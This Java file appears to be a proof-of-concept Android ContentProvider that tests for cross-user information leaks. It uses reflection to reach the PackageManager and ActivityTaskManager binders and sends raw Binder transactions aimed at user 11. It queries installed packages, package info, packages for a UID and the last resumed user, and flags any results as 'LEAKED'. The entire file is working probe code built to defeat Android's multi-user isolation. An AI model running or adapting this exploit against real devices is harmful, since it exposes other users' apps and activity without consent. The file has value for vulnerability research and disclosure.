package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class PMCrossUserProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder binder = getServiceBinder("package");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no package binder"});
            return cursor;
        }

        String desc = "android.content.pm.IPackageManager";

        // TX=36: getInstalledPackages(flags, userId)
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeLong(0); // PackageManager.PackageInfoFlags (long on Android 14+)
                data.writeInt(userId);
                binder.transact(36, data, reply, 0);
                reply.readException();
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"getInstalledPkgs_u" + userId,
                    "OK avail=" + avail});
                // Try to read ParceledListSlice header
                if (avail > 4) {
                    int count = reply.readInt();
                    cursor.addRow(new Object[]{"  pkg_count_u" + userId, String.valueOf(count)});
                    if (count > 0 && count < 5000) {
                        cursor.addRow(new Object[]{"  u" + userId + "_LEAKED",
                            count + " packages from user " + userId + " visible!"});
                    }
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"getInstalledPkgs_u" + userId,
                    "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"getInstalledPkgs_u" + userId,
                    "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=3: getPackageInfo(packageName, flags, userId)
        String[] targets = {"com.google.android.gms", "com.android.settings",
            "com.android.systemui", "com.google.android.apps.messaging"};
        for (String pkg : targets) {
            for (int userId : new int[]{0, 11}) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeString(pkg);
                    data.writeLong(0); // flags (long)
                    data.writeInt(userId);
                    binder.transact(3, data, reply, 0);
                    reply.readException();
                    int marker = reply.readInt();
                    if (marker != 0) {
                        cursor.addRow(new Object[]{"getPkgInfo_" + shortPkg(pkg) + "_u" + userId,
                            "GOT_DATA (Parcelable present)"});
                    } else {
                        cursor.addRow(new Object[]{"getPkgInfo_" + shortPkg(pkg) + "_u" + userId,
                            "null (not installed or hidden)"});
                    }
                } catch (SecurityException e) {
                    cursor.addRow(new Object[]{"getPkgInfo_" + shortPkg(pkg) + "_u" + userId,
                        "DENIED:" + truncate(e.getMessage())});
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"getPkgInfo_" + shortPkg(pkg) + "_u" + userId,
                        "ERR:" + truncate(e.getMessage())});
                }
                data.recycle();
                reply.recycle();
            }
        }

        // TX=20: getPackagesForUid(uid)
        // Try UIDs in user 11 range (11*100000 + appId)
        int[] uidsToTest = {1110000, 1110001, 1110073, 1110078};
        for (int uid : uidsToTest) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(uid);
                binder.transact(20, data, reply, 0);
                reply.readException();
                // String[] result
                int count = reply.readInt();
                if (count > 0) {
                    StringBuilder sb = new StringBuilder("count=" + count + " [");
                    for (int i = 0; i < Math.min(count, 5); i++) {
                        sb.append(reply.readString()).append(",");
                    }
                    sb.append("]");
                    cursor.addRow(new Object[]{"pkgsForUid_" + uid, sb.toString()});
                } else {
                    cursor.addRow(new Object[]{"pkgsForUid_" + uid, "empty/null"});
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"pkgsForUid_" + uid,
                    "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"pkgsForUid_" + uid,
                    "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=107: getDestinationPackage - new in Android 16
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // Try with minimal params - need to figure out signature
            binder.transact(107, data, reply, 0);
            reply.readException();
            String result = reply.readString();
            cursor.addRow(new Object[]{"getDestPkg_tx107",
                result != null ? "GOT:" + result : "null"});
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"getDestPkg_tx107",
                "DENIED:" + truncate(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getDestPkg_tx107",
                "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // Also test IActivityTaskManager TX=77: getLastResumedActivityUserId
        IBinder atmBinder = getServiceBinder("activity_task");
        if (atmBinder != null) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("android.app.IActivityTaskManager");
                atmBinder.transact(77, data, reply, 0);
                reply.readException();
                int lastUserId = reply.readInt();
                cursor.addRow(new Object[]{"lastResumedUserId", String.valueOf(lastUserId)});
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"lastResumedUserId", "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"lastResumedUserId", "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        return cursor;
    }

    private String shortPkg(String pkg) {
        String[] parts = pkg.split("\\.");
        return parts[parts.length - 1];
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
